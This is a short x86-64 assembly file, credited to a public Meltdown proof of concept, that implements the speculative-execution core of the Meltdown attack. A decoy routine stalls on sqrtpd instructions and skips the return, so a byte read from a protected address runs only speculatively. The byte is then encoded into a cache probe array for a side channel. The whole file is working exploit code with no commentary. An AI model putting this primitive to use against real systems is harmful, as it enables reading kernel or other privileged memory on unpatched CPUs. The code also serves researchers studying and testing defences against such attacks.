## Reference : https://github.com/corsix/meltdown-poc/blob/master/speculate.s

.global speculate
	speculate:
		mfence
		call herring
		movzbl (%rdi),%eax
		shl    $0xc,%eax
		movzbl (%rsi,%rax,1),%eax

.global herring
	herring:
		xorps  %xmm0,%xmm0		
		sqrtpd %xmm0,%xmm0
		sqrtpd %xmm0,%xmm0
		sqrtpd %xmm0,%xmm0
		sqrtpd %xmm0,%xmm0
		movd   %xmm0,%eax
		lea    0x8(%rsp,%rax,1),%rsp
		retq
